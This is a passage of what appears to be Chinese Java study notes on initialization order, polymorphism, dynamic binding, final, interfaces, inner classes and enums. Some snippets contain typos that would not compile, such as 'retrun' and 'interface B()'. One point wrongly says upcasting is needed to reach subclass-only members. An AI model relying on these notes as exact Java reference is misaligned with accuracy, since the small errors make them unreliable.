title="重载与重写的区别"></a>重载与重写的区别</h2><p><strong>重载</strong>：<strong>同一个类</strong>，方法名相同，参数类型、个数或顺序不同，与返回值和修饰符无关</p><p><strong>重写</strong>：<strong>父类和子类</strong>中，方法名、参数相同，子类返回类型与父类一样或者是其子类，子类不能缩小父类的缩小访问范围</p><h1 id="代码块"><a href="#代码块" class="headerlink" title="代码块"></a>代码块</h1><h2 id="静态代码块"><a href="#静态代码块" class="headerlink" title="静态代码块"></a>静态代码块</h2><p>可以定义多个，与静态属性初始化优先级一样，按照定义顺序执行，随着类的加载而执行，只执行一次，执行时机比普通代码块早</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">static</span> &#123;<br>       System.out.println(<span class="hljs-string">&quot;abcdef&quot;</span>);<br>   &#125;<br>   <span class="hljs-keyword">static</span> &#123;<br>       System.out.println(<span class="hljs-string">&quot;abcc&quot;</span>);<br>   &#125;<br></code></pre></td></tr></table></figure><h2 id="普通代码块"><a href="#普通代码块" class="headerlink" title="普通代码块"></a>普通代码块</h2><p>可以定义多个，按照定义顺序执行，随着对象创建而执行，提高构造器代码复用性，每次创建对象都会执行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">B</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">A</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-comment">//1)super()</span><br>        <span class="hljs-comment">//2)调用本类普通代码块</span><br>        System.out.println(<span class="hljs-string">&quot;3&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="类什么时候被加载"><a href="#类什么时候被加载" class="headerlink" title="类什么时候被加载"></a>类什么时候被加载</h2><ul><li><p>创建对象实例</p></li><li><p>创建子对象实例，父类也会被加载</p></li><li><p>使用类的静态成员时</p></li><li><p>使用子类静态成员时，父类也会被加载</p></li></ul><h2 id="创建对象时的调用顺序"><a href="#创建对象时的调用顺序" class="headerlink" title="创建对象时的调用顺序"></a>创建对象时的调用顺序</h2><ol><li>父类的静态代码块和静态属性初始化</li><li>子类的静态代码块和静态属性初始化</li><li>父类的普通代码块和普通属性初始化</li><li>父类的构造方法</li><li>子类的普通代码块和普通属性初始化</li><li>子类的构造方法</li></ol><p><strong>静态代码块只能调用静态成员，普通代码块可以调用任意成员</strong></p><h2 id="执行-new-Test-会输出什么"><a href="#执行-new-Test-会输出什么" class="headerlink" title="执行 new Test();会输出什么"></a>执行 new Test();会输出什么</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo</span>&#123;<br>    Demo(String s)&#123;<br>        System.out.println(s);<br>    &#125;<br>    Demo()&#123;<br>        System.out.println(<span class="hljs-string">&quot;Demo无参&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span>&#123;<br>    Demo demo1=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Demo</span>(<span class="hljs-string">&quot;Demo1初始化&quot;</span>);    <span class="hljs-comment">//第三步</span><br>    <span class="hljs-keyword">static</span> Demo demo2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Demo</span>(<span class="hljs-string">&quot;Demo2初始化&quot;</span>); <span class="hljs-comment">//第一步</span><br>    <span class="hljs-keyword">static</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;static执行&quot;</span>); <span class="hljs-comment">//第二步</span><br>        <span class="hljs-keyword">if</span>(demo2==<span class="hljs-literal">null</span>)<br>            System.out.println(<span class="hljs-string">&quot;demo2 is null&quot;</span>);<br>    &#125;<br>    Test()&#123;<br>        System.out.println(<span class="hljs-string">&quot;Test无参&quot;</span>);   <span class="hljs-comment">//最后一步</span><br>    &#125;<br>&#125;<br>输出：<br>Demo2初始化<br><span class="hljs-keyword">static</span>执行<br>Demo1初始化<br>Test无参<br></code></pre></td></tr></table></figure><h1 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h1><h2 id="多态参数"><a href="#多态参数" class="headerlink" title="多态参数"></a>多态参数</h2><p>参数定义成父类类型，就可以传任意子类类型进去</p><h2 id="向上转型"><a href="#向上转型" class="headerlink" title="向上转型"></a>向上转型</h2><p><strong>a）</strong> 语法：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">父类类型引用名<span class="hljs-operator">=</span>new子类类型（）；<br></code></pre></td></tr></table></figure><p><strong>b）</strong> 父类引用指向子类对象</p><p><strong>c）</strong> 编译类型看左边，运行类型看右边</p><p><strong>d）</strong> 可以调用父类中所有成员（受访问修饰符影响）</p><p><strong>e）</strong>调用的时候，<strong>子类有就用子类的成员，没有就找父类（就近原则）</strong></p><p><strong>f）</strong>不能调用子类中特有成员</p><h2 id="注意事项-1"><a href="#注意事项-1" class="headerlink" title="注意事项"></a>注意事项</h2><p><strong>a）</strong>多态的前提：<strong>连个对象（类）存在继承关系</strong></p><p><strong>b）</strong>属性的值看编译类型</p><p><strong>c）</strong>方法都看运行类型，属性看编译类型</p><p><strong>d）</strong> <strong>instanceof</strong> 比较操作符，用于判断对象的运行类型是否为 XX 类型或 XX 类型的子类型</p><p><strong>e）</strong>要调用子类中的特有成员要向上转型</p><h2 id="多态数组"><a href="#多态数组" class="headerlink" title="多态数组"></a>多态数组</h2><p>数组类型为父类类型，保存实际元素为子类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Hello</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        B b=<span class="hljs-keyword">new</span> <span class="hljs-title class_">B</span>();<br>        System.out.println(b.count);<br>        b.display();<br>        A a=b;<br>        System.out.println(a==b);<br>        System.out.println(a.count);<br>        a.display();<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>&#123;<br>    <span class="hljs-type">int</span> count=<span class="hljs-number">100</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">display</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-built_in">this</span>.count);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">B</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">A</span>&#123;<br>    <span class="hljs-type">int</span> count=<span class="hljs-number">200</span>;<br>    <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">display</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-built_in">this</span>.count);<br>    &#125;<br>&#125;<br>输出：<br><span class="hljs-number">200</span><br><span class="hljs-number">200</span><br><span class="hljs-literal">true</span><br><span class="hljs-number">100</span><br><span class="hljs-number">200</span><br></code></pre></td></tr></table></figure><h1 id="动态绑定机制"><a href="#动态绑定机制" class="headerlink" title="动态绑定机制"></a>动态绑定机制</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Hello</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>       A a=<span class="hljs-keyword">new</span> <span class="hljs-title class_">B</span>();<br>       System.out.println(a.sum());<br>       System.out.println(a.sum1());<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>&#123;<br>   <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> i=<span class="hljs-number">10</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">sum</span><span class="hljs-params">()</span>&#123;<br>       <span class="hljs-keyword">return</span> getI()+<span class="hljs-number">10</span>;<br>   &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">sum1</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> i+<span class="hljs-number">10</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getI</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> i;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">B</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">A</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> i=<span class="hljs-number">20</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">sum</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> i+<span class="hljs-number">10</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getI</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> i;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">sum1</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> i+<span class="hljs-number">10</span>;<br>    &#125;<br>&#125;<br>输出：<span class="hljs-number">30</span><span class="hljs-number">30</span><br></code></pre></td></tr></table></figure><p>1.当调用对象方法时，该方法会和该对象内存地址&#x2F;运行类型绑定</p><p>2.当调用对象属性时，没有动态绑定机制，就近原则</p><h1 id="equals"><a href="#equals" class="headerlink" title="equals"></a>equals</h1><h2 id="Object"><a href="#Object" class="headerlink" title="Object"></a>Object</h2><p>Object 是所有对象的父类，也就是所有对象都可以使用 Object 里面的方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">equals getClass hashCode toString<br></code></pre></td></tr></table></figure><h2 id=""><a href="#" class="headerlink" title="&#x3D;&#x3D;"></a>&#x3D;&#x3D;</h2><p>判断基本类型和引用类型</p><p>基本类型判断<strong>值</strong>，引用类型判断<strong>地址</strong></p><h2 id="equals-1"><a href="#equals-1" class="headerlink" title="equals"></a>equals</h2><p><strong>只能判断引用类型，默认判断地址是否相等</strong></p><p>子类一般会重写 equals 方法，判断内容是否相等，比如 Integer、String</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java">Person p1=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>  p1.name=<span class="hljs-string">&quot;abc&quot;</span>;<br>  Person p2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>  p2.name=<span class="hljs-string">&quot;abc&quot;</span>;<br>  System.out.println(p1==p2); <span class="hljs-comment">//False</span><br>  System.out.println(p1.equals(p2));  <span class="hljs-comment">//False</span><br>  System.out.println(p1.name.equals(p2.name));    <span class="hljs-comment">//True</span><br>  System.out.println(p1.name==p2.name);   <span class="hljs-comment">//True</span><br>      <br>  String s1=<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-string">&quot;a&quot;</span>);<br>  String s2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-string">&quot;a&quot;</span>);<br>  System.out.println(s1==s2); <span class="hljs-comment">//False</span><br>  System.out.println(s1.equals(s2));  <span class="hljs-comment">//True</span><br></code></pre></td></tr></table></figure><h1 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="toString"></a>toString</h1><h2 id="toString-方法"><a href="#toString-方法" class="headerlink" title="toString 方法"></a>toString 方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span>&#123;<br>    retrun <span class="hljs-title function_">getClass</span><span class="hljs-params">()</span>.getName()+<span class="hljs-string">&quot;@&quot;</span>+Integer.toHexString(hashCode());<br>&#125;<br></code></pre></td></tr></table></figure><p>默认返回：全类名+@+哈希值的十六进制</p><p>子类往往重写 toString 方法，用于返回对象的属性信息</p><p>直接输出一个对象时，toString 方法会被默认调用</p><h2 id="finalize-方法"><a href="#finalize-方法" class="headerlink" title="finalize 方法"></a>finalize 方法</h2><p>子类重写该方法，释放资源</p><p>某个对象没有任何引用时，垃圾回收机制会销毁该对象，销毁前调用 finalize 方法</p><p>也可以通过 System.gc() 主动触发垃圾回收机制，但不一定马上回收</p><h1 id="final"><a href="#final" class="headerlink" title="final"></a>final</h1><h2 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h2><p>a）不希望类被继承时</p><p>b）不希望属性值被修改时（常量）</p><p>c）不希望父类的方法被子类覆盖&#x2F;重写（override）</p><p>d）不希望局部变量（参数）被修改（局部变量）</p><p><strong>final修饰实例属性，可以在定义时，构造器、普通代码块中赋值</strong></p><p><strong>final修饰静态属性，可以在定义时、静态代码块中赋初值</strong></p><h2 id="final-注意事项"><a href="#final-注意事项" class="headerlink" title="final 注意事项"></a>final 注意事项</h2><p>a）final 修饰属性必须赋值，并且不可修改</p><p>b）final 可以修饰类、属性、方法和局部变量，不能修饰构造器</p><p>c）包装类（Double、Integer、Float、Boolean ）和 String 都是 final 类</p><p>d）final 修饰类不能被继承，但能被实例化（需要不被实例化把类改成 private）</p><p>e）final 和 static 搭配使用不会加载类</p><h1 id="抽象类"><a href="#抽象类" class="headerlink" title="抽象类"></a>抽象类</h1><h2 id="abstract-只能修饰类和方法"><a href="#abstract-只能修饰类和方法" class="headerlink" title="abstract 只能修饰类和方法"></a>abstract 只能修饰类和方法</h2><p>用 abstract 关键字修饰一个类时，这个类就叫抽象类，修饰方法时就叫抽象方法</p><h2 id="注意事项-2"><a href="#注意事项-2" class="headerlink" title="注意事项"></a>注意事项</h2><p>抽象类可以有任意成员，可以被继承，可以没有抽象方法</p><p><strong>抽象类不能被实例化</strong></p><p>有了抽象方法，这个类必须声明为 abstract</p><p>继承了抽象类，必须实现抽象类的所有抽象方法，除非它自己也声明为 abstract 类</p><p><strong>抽象方法不能使用 private、final 和 static 修饰</strong></p><h1 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h1><h2 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">interface 接口名&#123;<br><span class="hljs-comment">//属性</span><br><span class="hljs-comment">//方法</span><br>&#125;<br>class 类名 implements 接口名&#123;<br>必须实现接口的所有抽象方法<br>&#125;<br></code></pre></td></tr></table></figure><p>用来制定规则</p><h2 id="注意事项-3"><a href="#注意事项-3" class="headerlink" title="注意事项"></a>注意事项</h2><ul><li>不能被实例化</li><li>接口的修饰只能是 public 和默认，这点和类的修饰符是一样的</li><li>不能继承其他的类，但可以继承多个别的接口</li><li>接口中的方法都是 public 方法，抽象方法可以不用 abstract 修饰，public abstract 可以省略</li><li>一个普通类实现接口就必须将该接口的所有方法实现</li><li>抽象类实现接口，可以不用实现接口的方法</li><li>一个类同时可以实现多个接口</li><li>接口中的属性都是 <strong>public static final</strong> 修饰符</li></ul><p>​访问形式：<strong>接口名. 属性名</strong></p><h2 id="接口的多态特性"><a href="#接口的多态特性" class="headerlink" title="接口的多态特性"></a>接口的多态特性</h2><p>多态参数、向上转型、多态数组</p><h2 id="接口的多态传递"><a href="#接口的多态传递" class="headerlink" title="接口的多态传递"></a>接口的多态传递</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">B</span>()<br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">A</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">B</span>()<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">C</span> <span class="hljs-keyword">implements</span>  <span class="hljs-title class_">A</span>&#123;&#125;<br>B b=<span class="hljs-keyword">new</span> <span class="hljs-title class_">C</span>();<br>A a=<span class="hljs-keyword">new</span> <span class="hljs-title class_">C</span>();<br></code></pre></td></tr></table></figure><h2 id="接口、继承"><a href="#接口、继承" class="headerlink" title="接口、继承"></a>接口、继承</h2><p>继承：提高代码复用性和可维护性</p><p>接口：设计好各种方法，让其他类去实现</p><h2 id="练习-1"><a href="#练习-1" class="headerlink" title="练习"></a>练习</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">AA</span>&#123;<span class="hljs-type">int</span> a=<span class="hljs-number">23</span>;&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">BB</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">AA</span>&#123;&#125;<br><br>main函数中：<br> BB b=<span class="hljs-keyword">new</span> <span class="hljs-title class_">BB</span>();<br>    System.out.println(b.a);<br>    System.out.println(AA.a);<br>    System.out.println(BB.a);<br></code></pre></td></tr></table></figure><h1 id="成员内部类"><a href="#成员内部类" class="headerlink" title="成员内部类"></a>成员内部类</h1><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><p>定义在外部类的成员位置上</p><p>a）成员内部类（无 static 修饰）</p><p>b）静态内部类（使用 static 修饰）</p><p>定义在外部类的局部位置上（比如方法类）：</p><p>a）局部内部类（有类名）</p><p>b）匿名内部类（没有类名）</p><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>定义在外部类的成员位置上，没有 static 修饰</p><h2 id="注意事项-4"><a href="#注意事项-4" class="headerlink" title="注意事项"></a>注意事项</h2><ul><li>可以直接访问外部类的所有成员，包含私有的</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">OuterClass</span>&#123;<br>    <span class="hljs-keyword">public</span> String name=<span class="hljs-string">&quot;butterfly&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> sex=<span class="hljs-literal">true</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">()</span>&#123;&#125;<br>    <br>    <span class="hljs-keyword">static</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;OuterClass static block&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">OuterClass</span><span class="hljs-params">(String name,<span class="hljs-type">int</span> age)</span>&#123;<br>        <span class="hljs-built_in">this</span>.name=name;<br>        <span class="hljs-built_in">this</span>.age=age;<br>    &#125;<br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">InnerClass</span>&#123;<br>        <span class="hljs-keyword">public</span> String language=<span class="hljs-string">&quot;java&quot;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">abc</span><span class="hljs-params">()</span> &#123;<br>            System.out.println(name);<br>            System.out.println(age);<br>            System.out.println(sex);<br>            test();<br>        &#125;<br>        &#123;<br>            System.out.println(<span class="hljs-string">&quot;InnerClass block&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">InnerClass</span><span class="hljs-params">(String language)</span>&#123;<br>            <span class="hljs-built_in">this</span>.language=language;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>可以添加任意访问修饰符去修饰成员内部类，因为相当于一个成员</li><li>成员内部类不能定义静态成员</li><li>作用域与其他成员一样</li><li>外部类可以访问成员内部类</li><li>外部其他类可以访问成员内部类</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>()..<span class="hljs-keyword">new</span> <span class="hljs-title class_">Inner</span>();<br></code></pre></td></tr></table></figure><p>​在外部类里面定义一个方法，返回内部类的对象</p><ul><li>外部类和内部类重名，就近原则。访问外部类成员，使用（外部类名.this.成员）去访问</li></ul><h2 id="获取内部类的类名"><a href="#获取内部类的类名" class="headerlink" title="获取内部类的类名"></a>获取内部类的类名</h2><p>getClass、jeb</p><h1 id="静态内部类"><a href="#静态内部类" class="headerlink" title="静态内部类"></a>静态内部类</h1><h2 id="概念-1"><a href="#概念-1" class="headerlink" title="概念"></a>概念</h2><p>有 static 修饰</p><h2 id="注意事项-5"><a href="#注意事项-5" class="headerlink" title="注意事项"></a>注意事项</h2><ul><li><p>只能访问外部类的静态成员，包含私有的</p></li><li><p>作用域属于整个类</p></li><li><p>可以添加任意访问修饰符去修饰静态内部类</p></li><li><p>外部类可以访问静态内部类</p></li><li><p>外部其他类可以访问静态内部类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>.Inner();<br></code></pre></td></tr></table></figure><p>在外部类里面定义一个方法，返回内部类的对象</p><ul><li>外部类和内部类重名，就近原则。访问外部类成员，使用（外部类名.静态成员名）去访问</li></ul></li></ul><h1 id="局部内部类"><a href="#局部内部类" class="headerlink" title="局部内部类"></a>局部内部类</h1><h2 id="概念-2"><a href="#概念-2" class="headerlink" title="概念"></a>概念</h2><p>定义在外部类的局部位置上，比如方法中，并且有类名</p><h2 id="注意事项-6"><a href="#注意事项-6" class="headerlink" title="注意事项"></a>注意事项</h2><ul><li>可以直接访问外部类所有成员</li><li>如果定义在静态方法中，只能访问外部类的静态成员</li><li>不能添加访问修饰符，可以用final 修饰</li><li>作用域仅在代码块中，与局部变量一致</li><li>重名遵循就近原则，访问外部类成员用<strong>（外部类名.this.成员）</strong>去访问（实例方法中），静态方法中，（外部类名.静态成员名）访问</li><li>外部类不能访问局部内部类</li></ul><h1 id="匿名内部类"><a href="#匿名内部类" class="headerlink" title="匿名内部类"></a>匿名内部类</h1><h2 id="语法-2"><a href="#语法-2" class="headerlink" title="语法"></a>语法</h2><p>基于接口的匿名内部类</p><p>基于类（抽象类）的匿名内部类</p><h2 id="注意事项-7"><a href="#注意事项-7" class="headerlink" title="注意事项"></a>注意事项</h2><ul><li>可以访问外部类，受访问修饰符影响，局部内部类不能定义静态成员</li><li>只能创建一个实例</li><li>就近原则，匿名内部类处于外部类里面时<strong>（外部类名.this.成员）</strong>静态成员（外部类名.静态类名）</li><li>外部类不能访问匿名内部类</li><li>匿名内部类在定义的同时直接创建对象，并且当作实参传递</li></ul><h1 id="枚举类"><a href="#枚举类" class="headerlink" title="枚举类"></a>枚举类</h1><h2 id="自定义枚举类"><a href="#自定义枚举类" class="headerlink" title="自定义枚举类"></a>自定义枚举类</h2><ul><li>构造器私有化</li><li>public static final 修饰的属性</li><li>创建对象赋值给这些属性</li><li>定义 toString 方法</li></ul><h2 id="enum-类"><a href="#enum-类" class="headerlink" title="enum 类"></a>enum 类</h2><ul><li>关键字 enum 代替 class</li></ul><h2 id="使用关键字-enum-时，会变成-final-类，并且隐式继承-Enum-类"><a href="#使用关键字-enum-时，会变成-final-类，并且隐式继承-Enum-类" class="headerlink" title="使用关键字 enum 时，会变成 final 类，并且隐式继承 Enum 类"></a>使用关键字 enum 时，会变成 final 类，并且隐式继承 Enum 类</h2><ul><li>javap 反编译 class</li><li>不能被继承或再继承其他类，但是可以实现接口</li><li>使用 Enum 类相关方法</li></ul><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java">Season autumn=Season.AUTUMN;<br><span class="hljs-comment">//name()返回枚举对象的名字</span><br>System.out.println(autumn.name());<br><span class="hljs-comment">//ordinal()返回枚举对象的次序/编号，从0开始编号</span><br>System.out.println(autumn.ordinal());<br><span class="hljs-comment">//values()返回定义的所有枚举对象</span><br>Season[] values=Season.values();<br><span class="hljs-comment">//valueOf()将字符串转换成枚举对象，字符串必须为已有的枚举对象名</span><br>Season autumn1=Season <span class="hljs-title function_">valueOf</span><span class="hljs-params">(<span class="hljs-string">&quot;AUTUMN&quot;</span>)</span>;<br>System.out.println(Season.SUMMER.compareTo(SEason.AUTUMN));<span class="hljs-comment">//两个值相减</span><br><span class="hljs-comment">//toString()</span><br></code></pre></td></tr></table></figure><h1 id="注解"><a href="#注解" class="headerlink" title="注解"></a>注解</h1><h2 id="Annotation"><a href="#Annotation" class="headerlink" title="Annotation"></a>Annotation</h2><p>retrofit2</p><h2 id="基本-Annotation"><a href="#基本-Annotation" class="headerlink" title="基本 Annotation"></a>基本 Annotation</h2><ul><li>@Override：验证方法为重写父类方法，只能用于方法</li><li>@Deprecated：用于表示某个元素（类&#x2F;方法等）已过时</li><li>@SuppressWarnings({“all”})：抑制编译器警告</li></ul><h2 id="注解类"><a href="#注解类" class="headerlink" title="注解类"></a>注解类</h2><ul><li>@Target（ElementType.METHOD），指定注解范围</li><li>@Target 修饰注解的注释，称为元注解</li><li>@interface 是注解类</li></ul><h1 id="try-catch"><a href="#try-catch" class="headerlink" title="try-catch"></a>try-catch</h1><p>try 包裹可能出现异常代码，catch 去捕获异常，try 